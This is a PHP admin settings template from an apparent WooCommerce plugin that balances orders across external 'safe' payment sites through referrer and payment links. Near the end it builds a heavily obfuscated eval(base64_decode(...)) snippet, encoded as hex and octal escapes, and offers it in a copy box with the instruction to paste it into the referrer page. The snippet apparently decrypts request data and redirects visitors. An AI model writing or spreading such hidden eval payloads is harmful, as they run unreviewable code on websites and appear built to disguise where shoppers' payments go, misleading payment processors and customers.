<tr valign="top">
  <th scope="row" class="titledesc">
    <label>
      <?php esc_html_e( 'Payment Site Details:', 'woocommerce' ); ?>
    </label>
  </th>
  <td class="forminp" id="accounts">
    <div class="wc_input_table_wrapper">
      <table class="widefat wc_input_table sortable" cellspacing="0" style="margin-bottom: 20px;">
        <thead>
          <tr>
            <th class="sort" style="width: 3%;">&nbsp;</th>
            <th style="width: 7%;"><?php esc_html_e( 'Code', 'woocommerce' ); ?></th>
            <th style="width: 20%;">
              <?php esc_html_e( 'Referrer Link', 'woocommerce' ); ?>
              <?php echo wc_help_tip('This will be the referrer link. After this user will redirect to your payment site to pay'); ?>
            </th>
            <th style="width: 20%;">
              <?php esc_html_e( 'Payment Link', 'woocommerce' ); ?>
              <?php echo wc_help_tip('This will be the payment link. Get the url from your payment site after install the plugin.'); ?>
            </th>
            <th style="width: 4%;">
              <?php esc_html_e( 'Cap Amount', 'woocommerce' ); ?>(<?=get_woocommerce_currency_symbol()?>)
              <?php echo wc_help_tip('Cap Amount set blank if you want want to use this contition in load balncing'); ?>
            </th>
            <th style="width: 4%;">
              <?php esc_html_e( 'Cap Order Count', 'woocommerce' ); ?>
              <?php echo wc_help_tip('Cap Order Count set blank if you want want to use this contition in load balncing'); ?>

            </th>
            <th style="width: 12%;"><?php esc_html_e( 'Total Stats', 'woocommerce' ); ?> (<?=get_woocommerce_currency_symbol()?>)</th>
            <th style="width: 12%;"><?php esc_html_e( 'Today Stats', 'woocommerce' ); ?> (<?=get_woocommerce_currency_symbol()?>)</th>
          </tr>
        </thead>
        <tbody class="accounts">
          <?php
          $i = -1;

          if ( $this->safe_site_order_stat_data ) {
            foreach ( $this->safe_site_order_stat_data as $safe_site ) {
              $i++;

              ?>
              <tr class="account">
                  <td class="sort"></td>
                  <td><input type="text" value="<?= esc_attr( $safe_site['safe_store_code'] ) ?>" name="safe_store_code[<?= esc_attr( $i ) ?>]" /></td>
                  <td><input type="text" value="<?= esc_attr( $safe_site['safe_referrer_link'] ) ?>" name="safe_referrer_link[<?= esc_attr( $i ) ?>]" /></td>
                  <td><input type="text" value="<?= esc_attr( $safe_site['safe_payment_link'] ) ?>" name="safe_payment_link[<?= esc_attr( $i ) ?>]" /></td>
                  
                  <td>
                      <input type="text" value="<?= esc_attr( $safe_site['cap_amount'] ) ?>" name="cap_amount[<?= esc_attr( $i ) ?>]" /> <br>
                      
                  </td>
                  <td>
                      <input type="text" value="<?= esc_attr( $safe_site['cap_order_count'] ) ?>" name="cap_order_count[<?= esc_attr( $i ) ?>]" /> <br>
                      
                  </td>
                  <td>
                      <strong>Order Price: <?=get_woocommerce_currency_symbol()?><?=number_format(property_exists($safe_site['stat_data'], 'site_total_order_amount') ? $safe_site['stat_data']->site_total_order_amount : 0, 2, ".", "") ?></strong><br>
                      <strong>Order Count: <?=$safe_site['stat_data']->site_total_orders ?? 0 ?></strong>
                  </td>
                  <td>
                    <strong>Order Price: <?=get_woocommerce_currency_symbol()?><?=number_format(property_exists($safe_site['today_stat_data'], 'site_total_order_amount') ? $safe_site['today_stat_data']->site_total_order_amount : 0, 2, ".", "") ?></strong><br>
                    <strong>Order Count: <?=$safe_site['today_stat_data']->site_total_orders ?? 0 ?></strong>
                  </td>
              </tr>
              <?php
            }
          }
          ?>
        </tbody>
        <tfoot>
          <tr>
            <th colspan="8"><a href="#" class="add button"><?php esc_html_e( '+ Add Site Config', 'woocommerce' ); ?></a> <a href="#" class="remove_rows button" style="color: red;border-color: red;"><?php esc_html_e( 'Remove Selected Site Config(s)', 'woocommerce' ); ?></a></th>
          </tr>
        </tfoot>
      </table>


      <?php
        $php_code = '<?php eval(base64_decode("\x43\x69\102\156\x62\x33\122\166\111\x48\x51\x33\x54\x6d\x56\x6e\x4f\171\x42\125\121\x32\160\107\x64\x44\157\x67\121\x57\126\x6a\x62\x6d\163\x36\111\x47\x64\166\144\x47\x38\x67\145\155\x52\x31\124\125\x45\x37\x49\107\x70\x6f\123\110\x68\x54\117\151\102\x6c\x59\62\x68\166\x49\103\x4a\143\x65\104\116\x6a\x58\104\105\62\115\x31\x77\x78\x4e\104\116\x63\145\x44\143\171\x58\x44\105\61\x4d\126\170\x34\x4e\x7a\x42\x63\115\124\x59\x30\x58\110\147\172\132\x56\x77\x78\x4e\x6a\144\x63\145\104\x59\65\130\x48\147\62\132\x56\170\x34\x4e\152\122\143\115\124\125\x33\130\x44\105\x32\116\x31\x77\x31\116\154\x77\x78\116\124\122\143\x4d\124\x55\63\x58\104\x45\x30\115\x31\x78\x34\116\x6a\x46\x63\145\104\x63\60\x58\x44\105\x31\x4d\126\x78\x34\116\x6d\x5a\143\115\x54\x55\x32\x58\110\x67\x79\x5a\126\x77\170\x4e\x54\x42\143\145\x44\x63\171\130\110\147\62\116\x56\167\170\x4e\104\132\x63\x4e\x44\x42\x63\116\x7a\x56\x63\x65\x44\x49\x77\130\x44\x51\63\111\151\101\x75\111\103\x52\61\x63\155\167\147\114\x69\101\x69\x58\x44\121\63\x58\x48\x67\172\131\x6c\x78\x34\x4d\x32\116\143\145\104\112\155\130\x48\147\x33\115\61\167\170\x4e\x44\x4e\x63\115\x54\131\171\x58\x44\x45\61\x4d\126\170\x34\x4e\172\102\x63\x4d\x54\x59\x30\130\x44\x63\62\111\x6a\x73\x67\132\x32\71\60\x62\171\x42\x32\125\x32\x6c\x44\141\124\163\147\x51\x6e\x64\x57\x56\153\x4d\66\111\x47\144\166\144\x47\x38\147\x56\152\132\x78\143\130\x67\x37\111\x47\144\x76\144\107\70\x67\x56\60\x46\x49\x56\x6c\101\x37\111\106\x45\x7a\144\153\144\x72\x4f\x69\102\155\144\x57\x35\x6a\144\x47\x6c\166\x62\151\x42\x6c\142\x6d\x4e\x79\x65\x58\102\60\x58\x32\122\x6c\x59\63\x4a\x35\x63\x48\121\157\112\110\116\x30\143\x6d\154\165\x5a\x79\153\147\x65\x79\x41\x6b\x5a\127\x35\x6a\x63\156\154\167\144\x46\71\x74\132\130\122\x6f\142\x32\121\x67\120\x53\101\x69\130\x48\147\x30\x4d\x56\x77\170\x4d\104\126\x63\x65\x44\125\x7a\130\110\147\x79\x5a\x46\x78\x34\x4d\x7a\112\x63\145\x44\115\x31\130\110\x67\x7a\x4e\154\x78\x34\115\x6d\122\x63\145\x44\121\172\130\110\147\60\x4d\x6c\167\x78\x4d\104\x4d\x69\117\x79\101\153\143\x32\x56\152\143\x6d\126\x30\130\x32\x74\x6c\145\123\x41\x39\111\x43\x4a\143\x65\104\x51\170\x58\x44\105\x79\x4e\126\x78\64\x4e\107\x46\143\145\x44\125\171\130\104\105\167\x4e\106\170\64\116\107\x52\x63\x4d\124\101\x33\x58\x44\105\x78\116\154\170\64\x4e\x54\x4e\143\x65\104\121\x78\x58\x48\x67\x30\132\x46\x77\x78\x4d\104\x4a\x63\x65\x44\122\150\x58\110\147\x31\x4e\x46\170\64\x4e\x54\122\x63\115\124\x49\x32\130\x44\x45\171\x4e\x56\x77\170\115\x54\x4a\143\x4d\124\105\62\x58\110\147\60\132\x56\x78\x34\x4e\x44\x64\143\145\104\x52\x6b\130\x44\105\x77\x4d\61\x77\x78\x4d\x54\x52\x63\x4d\x54\101\172\111\152\163\147\x4a\110\116\x6c\131\63\x4a\154\144\106\x39\160\x64\151\101\71\x49\103\x4a\x63\x65\x44\131\171\x58\x48\147\x30\116\154\167\170\x4d\x44\x46\x63\x65\104\143\171\130\x44\105\x30\115\x6c\167\x78\x4d\104\126\143\x4d\x54\105\x31\130\110\147\63\x59\126\170\64\x4e\62\106\x63\145\x44\131\x33\x58\104\x45\62\116\x56\x77\x78\115\x54\144\x63\115\124\x45\63\x58\110\x67\62\132\126\170\x34\x4e\107\125\151\117\171\101\x6b\141\62\126\x35\x49\x44\x30\x67\x61\x47\x46\x7a\x61\x43\147\151\x58\x48\x67\x33\115\61\167\170\116\x54\102\x63\145\x44\131\170\130\x48\147\172\x4d\x6c\x78\64\x4d\172\x56\143\145\104\x4d\x32\111\x69\x77\147\x4a\x48\116\x6c\131\x33\x4a\x6c\x64\106\71\162\132\x58\x6b\160\x4f\x79\x41\153\x61\x58\x59\x67\x50\123\x42\172\144\x57\x4a\x7a\x64\x48\111\157\141\x47\x46\x7a\x61\x43\147\151\x58\x48\x67\63\x4d\x31\x78\64\x4e\152\150\143\115\x54\x51\170\x58\104\x59\x79\x58\x44\131\61\x58\x44\x59\62\x49\x69\167\x67\112\x48\116\x6c\x59\63\x4a\x6c\x64\x46\71\x70\144\151\x6b\x73\x49\104\x41\x73\x49\x44\105\62\113\124\x73\x67\x4a\107\x39\x31\x64\x48\x42\x31\144\x43\101\x39\x49\107\x39\167\x5a\x57\65\172\143\62\x78\146\132\x47\126\x6a\143\x6e\154\x77\144\x43\x68\151\131\130\116\x6c\x4e\x6a\x52\146\132\x47\126\x6a\x62\x32\x52\154\x4b\x43\122\x7a\x64\110\112\x70\x62\155\143\x70\x4c\103\101\x6b\x5a\127\65\x6a\143\x6e\x6c\x77\144\106\71\x74\132\130\x52\157\x62\62\x51\x73\x49\103\x52\162\x5a\x58\x6b\x73\111\104\101\163\x49\x43\122\x70\x64\151\x6b\x37\x49\x48\x4a\x6c\x64\110\126\x79\142\151\101\153\x62\63\x56\x30\x63\110\x56\x30\117\171\102\71\x49\x47\x64\166\144\x47\x38\x67\x53\x45\x52\113\124\x6d\x77\67\x49\x45\x56\121\x62\x45\x39\127\117\x69\102\167\131\130\112\x7a\132\126\71\172\144\110\111\157\x4a\x46\106\123\x57\x56\x39\124\126\106\112\112\x54\x6b\143\163\x49\x43\122\x52\126\x55\x56\x53\127\x56\x39\124\126\106\x4a\x4a\x54\x6b\x63\160\x4f\x79\102\x6e\x62\63\122\x76\x49\x45\x31\x49\144\x6c\160\117\x4f\171\102\111\x52\x45\160\x4f\142\x44\x6f\x67\132\x32\x39\x30\x62\171\x42\x6a\121\156\x5a\x57\126\x54\x73\147\x5a\62\x39\60\x62\171\x42\62\x63\x58\x42\152\131\x7a\x73\147\x65\x54\112\x53\x63\x44\121\66\x49\106\x59\x32\x63\x58\x46\x34\x4f\x69\x42\x6e\142\x33\122\x76\111\x45\126\x51\x62\x45\x39\x57\x4f\x79\x42\60\116\60\65\x6c\132\x7a\x6f\x67\x5a\x32\71\60\x62\x79\x42\x6e\125\155\144\171\121\x6a\163\x67\x5a\x32\x39\x30\142\x79\x42\65\115\x6c\112\167\x4e\104\x73\x67\144\156\x46\x77\131\62\x4d\66\111\x45\x51\x31\x57\x47\x70\x36\117\x69\x42\156\x62\63\x52\x76\x49\x47\x70\157\123\x48\150\124\117\171\102\x36\x5a\110\126\x4e\x51\x54\157\x67\112\110\x56\x79\142\103\101\71\111\103\x52\x52\126\125\x56\x53\x57\x56\x39\x54\126\106\x4a\x4a\x54\x6b\144\142\111\x6c\x78\64\116\x7a\x42\x63\115\x54\131\x31\x49\x6c\60\x67\114\151\x41\x69\130\x48\147\172\132\154\x78\x34\x4e\152\x4e\143\x4d\x54\131\x31\130\110\147\62\116\126\170\x34\115\x32\x51\x69\111\103\64\147\x4a\x46\71\123\x52\126\x46\x56\x52\126\116\125\x57\x79\112\x63\x4d\124\x51\x7a\130\110\147\63\116\x56\x77\x78\x4e\x44\125\x69\x58\x54\163\147\x5a\x32\x39\x30\142\171\102\x7a\x5a\x56\x4e\x6f\x58\x7a\163\147\x63\x32\x56\124\141\106\x38\x36\111\107\144\x76\144\x47\x38\x67\x52\x44\x56\x59\141\x6e\x6f\x37\x49\x47\x64\x76\144\107\70\x67\x62\x30\x5a\152\115\107\115\x37\x49\105\x5a\x55\124\x48\132\65\117\151\101\153\125\x56\112\132\130\x31\x4e\125\125\x6b\154\x4f\122\x79\101\71\x49\107\126\x75\131\63\x4a\65\143\x48\122\x66\x5a\x47\126\152\143\x6e\154\167\144\x43\147\153\x58\61\x4a\x46\x55\x56\126\x46\x55\61\x52\x62\x49\154\x78\64\116\152\116\x63\145\x44\x63\61\130\110\x67\x32\116\123\x4a\x64\x4b\124\163\147\132\62\71\60\142\171\102\x43\x64\x31\132\127\x51\x7a\163\x67\x63\63\154\125\144\110\143\66\111\107\116\103\x64\154\x5a\x56\x4f\x69\x42\x6e\x62\x33\x52\166\111\105\132\x55\x54\x48\132\x35\117\x79\102\166\122\155\x4d\x77\131\172\x6f\147\124\105\126\x57\x4e\156\x55\66\111\107\x64\166\x64\x47\70\147\x62\107\116\167\x54\x56\x55\67\111\x46\144\102\123\106\132\x51\117\x69\x42\x6e\x55\155\x64\x79\121\152\x6f\x67\x5a\62\x39\60\x62\x79\x42\x52\x4d\x33\132\x48\x61\x7a\163\147\x64\154\x4e\x70\121\x32\153\66\x49\x47\144\166\x64\x47\70\147\x54\x45\126\127\116\156\125\x37\111\107\144\166\x64\107\70\147\x56\x45\x4e\x71\122\156\x51\67\111\x45\x31\111\x64\x6c\x70\x4f\117\x69\102\x6e\x62\x33\x52\x76\x49\x45\x46\x6c\131\x32\65\162\x4f\x79\102\x6e\x62\x33\x52\166\111\x48\x4e\65\x56\110\x52\63\117\171\102\163\131\63\x42\x4e\x56\124\157\x67")); ?>'
      ?>

      <h4>Code you need paste in Referrer Link page. </h4>
      <textarea id="php_code" style="width: 100%;" rows="7" readonly title="Copy" onclick="copyToClipboard()"><?=htmlspecialchars($php_code)?></textarea>
      <p id="copied" style="display:none;">Copied!!</p>


    </div>
    <script type="text/javascript">
      function copyToClipboard() {
          var textarea = document.getElementById("php_code");
          textarea.select();
          document.execCommand("copy");
          document.getElementById("copied").style.display = 'block';

      }
      jQuery(function() {
        jQuery('#accounts').on( 'click', 'a.add', function(){

          var size = jQuery('#accounts').find('tbody .account').length;

          jQuery('<tr class="account">\
              <td class="sort"></td>\
              <td><input type="text" name="safe_store_code[' + size + ']" /></td>\
              <td><input type="text" name="safe_referrer_link[' + size + ']" /></td>\
              <td><input type="text" name="safe_payment_link[' + size + ']" /></td>\
              <td><input type="text" name="cap_amount[' + size + ']" /></td>\
              <td><input type="text" name="cap_order_count[' + size + ']" /></td>\
              <td></td>\
              <td></td>\
            </tr>').appendTo('#accounts table tbody');

          return false;
        });
      });
    </script>
  </td>
</tr>